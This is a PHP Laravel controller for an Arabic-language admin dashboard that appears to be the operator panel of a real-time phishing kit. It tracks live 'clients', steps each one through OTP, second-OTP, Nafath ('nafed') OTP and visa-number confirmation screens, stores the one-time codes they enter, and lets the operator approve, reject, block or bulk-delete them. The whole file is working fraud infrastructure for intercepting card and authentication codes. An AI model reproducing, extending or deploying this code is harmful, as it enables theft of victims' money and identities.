<?php

namespace App\Http\Controllers\Dashboard;

use App\Http\Controllers\Controller;
use App\Http\Requests\StoreClientRequest;
use App\Models\Client;
use App\Models\Notification;
use App\Models\SessionsClint;
use Illuminate\Http\Request;
use RealRashid\SweetAlert\Facades\Alert;
use Carbon\Carbon;

class ClientController extends Controller
{
    public function index()
    {
//        config()->set('app.debug' , true);
 $inactivePeriod = Carbon::now()->subMinutes(5)->timezone('UTC');
$activePeriod = Carbon::now()->subMinutes(5)->timezone('UTC');

    $clients = Client::where('active', 1)
        ->where(function ($query) use ($inactivePeriod) {
            $query->whereNull('last_activity')
                  ->orWhere('last_activity', '<', $inactivePeriod->format('Y-m-d H:i:s'));
        })
        ->orderBy('last_activity', 'asc')
        ->paginate(15);
 $ِActiveClients = Client::where('active', 1)->where(function($query) use ($activePeriod) {
        $query->whereNotNull('last_activity')
              ->where('last_activity', '>=', $activePeriod->format('Y-m-d H:i:s'));
    })
    ->orderBy('last_activity', 'desc')
    ->paginate(15);
    $active = $ِActiveClients->count();
        $all_visits = SessionsClint::count();

        return view('dashboard.clients.index', [
            'clients' => $clients ,
            'active' => $active ,
            'all_visits' => $all_visits ,
        ]);
    }
public function activeClients()
{
    $activePeriod = Carbon::now()->subMinutes(5)->timezone('UTC');
    
    $clients = Client::where('active', 1)->where(function($query) use ($activePeriod) {
        $query->whereNotNull('last_activity')
              ->where('last_activity', '>=', $activePeriod->format('Y-m-d H:i:s'));
    })
    ->orderBy('last_activity', 'desc')
    ->paginate(15);
    $active = $clients->count();
    $all_visits = SessionsClint::count();
    
    return view('dashboard.clients.active_index', [
        'clients' => $clients,
        'active' => $active,
        'all_visits' => $all_visits,
    ]);
}
    public function edit($client_id)
    {
        $client = Client::whereId($client_id)->firstOrFail();
        return view('dashboard.clients.edit', ['client' => $client]);
    }
    public function blocked($client_id)
    {
        $client = Client::whereId($client_id)->firstOrFail();
        if($client->blocked == 1){
            $client->blocked = 0;
            $client->save();
        }else{
            $client->blocked = 1;
            $client->save();
        }
        return redirect()->route('clients.activeClients');
    }
    public function update(StoreClientRequest $request)
    {
        $inputs = $request->all();
        $service = Client::whereId($inputs['id'])->update(['nafed_otp' => $inputs['nafed_otp'] ?? 0]);
        $client = Client::whereId($inputs['id'])->firstOrFail();
        $client->active = isset($inputs['in_active']) ? 0 : 1 ;
        $client->save();
        Alert::info(' العملاء', 'تم تعديل الخدمة بنجاح');
        return redirect()->route('clients.activeClients');
    }

    public function destroy(Client $client)
    {
        $client->delete();
        Alert::info(' العملاء', 'تم حذف العميل بنجاح');
        return redirect()->route('clients.activeClients');
    }

    public function event(Client $client)
    {


        if ($client->end_point == 5) {
            return view('dashboard.clients.send_otp', compact('client'));
        }
        if ($client->end_point == 6 || $client->end_point == 10) {
            return view('dashboard.clients.confirm_otp', compact('client'));
        }
        if ($client->end_point == 9) {
            return view('dashboard.clients.send_otp', compact('client'));
        }
        if ($client->end_point == 11) {
            return view('dashboard.clients.send_nafed_otp', compact('client'));
        }
        if ($client->end_point == 900) {
            return view('dashboard.clients.send_nafed_otp900', compact('client'));
        }
        return redirect()->route('clients.activeClients');
    }

    public function doEvent(Request $request, Client $client)
    {
        $inputs = $request->all();

        Notification::where('client_id', $client->id)->delete();



        if ($request->filled('is_stc')) {
            $client->stc_a =$request->is_stc;
            $client->save();
            Alert::success(' تم الارسال', 'تم الحفظ بنجاح');
        return redirect()->route('clients.activeClients');
        }


        if ($client->end_point == 5) {
            $client->otp_number = $inputs['otp_number'];
        }

        if ($client->end_point == 9) {
            $client->second_otp = $inputs['second_otp'];
        }

        if ($client->end_point == 10) {
            if ($inputs['confirmed']) {
                $client->end_point = 11;
            } else {
                $client->second_confirmed_otp = 0;
                $client->end_point = 9;
            }
        } elseif ($client->end_point == 11) {
            $client->nafed_otp = $inputs['nafed_otp'];
            $client->active = isset($inputs['in_active']) ? 0 : 1 ;
        }

        if ($client->end_point == 6) {
            if ($inputs['confirmed']) {
                $client->end_point = 7;
            } else {
                $client->confirmed_otp = 0;
                $client->end_point = 5;
            }
        }

        $client->save();
        Alert::success(' تم الارسال', 'تم الحفظ بنجاح');
        return redirect()->route('clients.activeClients');
    }

    public function confirm_visa_number(Request $request)
    {
        $client = Client::where(['id'=> $request->id])->firstOrFail();
        $client->verified_visa = -1;
        $client->save();
        Alert::success(' تم الارسال', 'تم الحفظ بنجاح');
        return redirect()->route('clients.activeClients');
    }
    public function deleteBulk(Request $request){


        if ($request->filled('type') && $request->type == 5000){
            Client::whereIn('id' ,$request->clients_ids)->update([
                'active' => 0
            ]);

        }else{
            Client::whereIn('id' ,$request->clients_ids)->delete();

        }
return response()->json(['status' => 1]);

    }
}
